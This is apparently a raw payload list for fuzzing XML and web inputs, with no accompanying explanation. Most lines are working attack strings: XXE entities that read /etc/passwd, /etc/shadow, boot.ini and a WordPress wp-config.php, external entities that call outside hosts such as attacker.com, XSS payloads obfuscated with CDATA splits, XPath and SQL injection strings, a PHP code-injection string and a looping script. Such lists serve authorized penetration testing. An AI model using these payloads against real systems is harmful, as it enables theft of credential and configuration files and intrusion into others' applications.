<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [<!ENTITY xxe7eb97 SYSTEM "file:///c:/boot.ini"> ]>
<!DOCTYPE foo [<!ENTITY xxe46471 SYSTEM "http://crowdshield.com/.testing/rfi_vuln.txt"> ]>
<?xml version="1.0"?><methodCall><methodName>demo.sayHello</methodName><params></params></methodCall>
<?xml version="1.0"?><change-log><text>Hello World</text></change-log>
<?xml version="1.0"?><change-log><text>&quot;Hello World&quot;</text></change-log>
<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"> ]><change-log><text>Hello &myEntity;</text></change-log>
<?xml version="1.0"?><!DOCTYPE change-log[ <!ENTITY myEntity "World"><!ENTITY myQuote "&quot;"> ]><change-log><text>&myQuote;Hello &myEntity;&myQuote;</text></change-log>
<!ENTITY systemEntity SYSTEM "robots.txt">
<change-log> <text>&systemEntity;</text> </change-log>
<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text> </change-log>
<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "../../../../boot.ini"> ]> <change-log> <text>&systemEntity;</text> </change-log>
<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "robots.txt"> ]> <change-log> <text>&systemEntity;</text>; </change-log>
<test> $lDOMDocument->textContent=<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]> </test>
<?xml version="1.0"?><change-log><text><script>alert(1)</script></text></change-log>
count(/child::node())
x' or name()='username' or 'x'='y
<name>','')); phpinfo(); exit;/*</name>
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><foo><![CDATA[' or 1=1 or ''=']]></foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file://c:/boot.ini">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////etc/shadow">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "http://xerosecurity.com/.testing/rfi_vuln.txt">]><foo>&xxe;</foo>
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>"
<xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
<xml SRC="https://crowdshield.com/.testing/rfi_vuln.txt" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
<HTML xmlns:xss><?import namespace="xss" implementation="https://crowdshield.com/.testing/xss.html"><xss:xss>XSS</xss:xss></HTML>
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="https://crowdshield.com/.testing/xss.html" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<?xml version='1.0' standalone='no'?><!DOCTYPE foo [<!ENTITY % f5a30 SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">%f5a30; ]>
‘
“
<?xml version="1.0"?> <!DOCTYPE change-log [ <!ENTITY systemEntity SYSTEM "../../../boot.ini" ]> <change-log> <text>&systemEntity;</text>; </change-log>
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "php://filter/read-convert.base64-encode/resource=file:///C:/boot.ini" >]><doc><test>Contents of file: &xxe;</test></doc>
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo> 
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> 
<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [     <!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi.txt" >]><foo>&xxe;</foo>
"}}</script><script>alert(1);</script></body></html><!-- 
}}</script>'"
}}</script>'
'}}</script>'
'}}</script>"
<?xml version="1.0" encoding="utf-16" standalone="yes"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>https://wordpress.org/</string></value></param><param><value><string>http://xerosecurity.com</string></value></param></params></methodCall>
<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "../../../../../../../etc/passwd">]><methodCall><methodName>&xxe</methodName></methodCall>
<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "http://xerosecurity.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
<xml version="1.0"?><!DOCTYPE XXE [<!ELEMENT methodName ANY ><!ENTITY xxe SYSTEM "https://crowdshield.com/.testing/rfi_vuln.txt">]><methodCall><methodName>&xxe</methodName></methodCall>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]><foo>&xxe;</foo>
<xml ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE doc [<!ELEMENT test ANY ><!ENTITY xxe SYSTEM "php://filter/read-convert.base64-encode/resource=file:///C:/htdocs/wordpress/wp-config.php" >]><doc><test>Contents of file: &xxe;</test></doc>
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo><?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo> <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY >   <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt">]><foo>&xxe;</foo>
}}</script><script>alert(1);</script></body></html><!-- 
"}}</script>'
}}</script>""'"
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="40px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">&xxe;</svg>
<?xml version="1.0" standalone="yes"?><!DOCTYPE ernw [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="500px" height="100px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-family="Verdana" font-size="16" x="10" y="40">&xxe;</text></svg>
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>

